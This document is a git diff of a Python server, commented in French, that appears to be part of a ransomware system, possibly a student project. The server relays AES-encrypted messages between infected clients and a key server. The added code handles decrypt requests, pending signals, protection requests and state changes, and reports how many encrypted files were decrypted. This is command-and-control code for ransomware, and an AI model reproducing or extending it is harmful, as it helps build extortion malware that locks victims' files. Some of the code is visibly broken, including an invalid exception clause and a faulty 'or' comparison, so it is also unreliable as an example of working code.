@@ -1,5 +1,6 @@
 import queue
 import threading
+
 # from threading import Thread, Lock
 import utile.network as network
 import utile.message as message
@@ -39,6 +40,24 @@ def handle_serv_cles():
     print("Connected to serveur de clés")
     key_serv_cle = security.diffie_hellman_send_key(serv_cle_socket)
     while True:
+        try:
+            serv_cle_socket.settimeout(1)
+            response_serv_cle_crypt = network.receive_message(serv_cle_socket)
+            if response_serv_cle_crypt:
+                response_serv_cle = security.aes_decrypt(response_serv_cle_crypt, key_serv_cle)
+                response_type = message.get_message_type(response_serv_cle)
+                if response_type == "DECRYPT":
+                    print("Message DECRYPT reçu du serveur de clés :", response_serv_cle)
+                    serv_cles_queue.put(response_serv_cle)
+                else:
+                    serv_cles_queue.put(response_serv_cle)
+                    print("Autre message reçu du serveur de clés :", response_serv_cle)
+        except serv_cle_socket.timeout(1):
+            print("Aucun message recu de la part du serveur clés")
+            pass  # Ignore les exceptions dues au timeout
+        except Exception as e:
+            pass
+            print("Erreur lors de la réception du message :", str(e))
         if not ransomware_queue.empty():
             message_ransomware, socket_ransomware = ransomware_queue.get()
             type_message = message.get_message_type(message_ransomware)
@@ -57,6 +76,22 @@ def handle_serv_cles():
                 message_serv_cle_crypt = security.aes_encrypt(message_ransomware, key_serv_cle)
                 network.send_message(serv_cle_socket, message_serv_cle_crypt)
                 print("Message envoyé : ", message_ransomware)
+            elif type_message == "PENDING_SIGNAL":
+                message_serv_cle_crypt = security.aes_encrypt(message_ransomware, key_serv_cle)
+                network.send_message(serv_cle_socket, message_serv_cle_crypt)
+                print("Message envoyé : ", message_ransomware)
+            elif type_message == "PROTECTREQ":
+                nb_files_decrypt = message_ransomware['NB_FILES']
+                message_serv_cle_crypt = security.aes_encrypt(message_ransomware, key_serv_cle)
+                network.send_message(serv_cle_socket, message_serv_cle_crypt)
+                print("Message envoyé : ", message_ransomware)
+                response_serv_cle_crypt = network.receive_message(serv_cle_socket)
+                response_serv_cle = security.aes_decrypt(response_serv_cle_crypt, key_serv_cle)
+                print("Message reçu : ", response_serv_cle)
+                message_to_ransomware = message.set_message("PROTECTRESP", [response_serv_cle['COUNT'], "We decrypted " + str(nb_files_decrypt) + " files out of " + str(response_serv_cle['NB_FILES']) + " encrypted files"])
+                serv_cles_queue.put(message_to_ransomware)
+
+
 
 
 def handle_ransomware():
@@ -77,6 +112,8 @@ def handle_client(socket_client):
         else:
             break
         while serv_cles_queue.empty():
+            if message.get_message_type(message_ransomware) == ("CHGSTATE" or "PENDING_SIGNAL"):
+                break
             pass
         else:
             while not serv_cles_queue.empty():
@@ -91,7 +128,7 @@ def handle_client(socket_client):
                 # Passer CONFIG_WORKSTATION en argument à set_message
                 message_to_ransomware = message.set_message("CONFIGURE", CONFIG_WORKSTATION)"""
                 network.send_message(socket_client, message_to_ransomware)
-                print("Message envoyé : ", message_to_ransomware)
+                print("Message envoyé au ransomware: ", message_to_ransomware)
 
 
 def main():
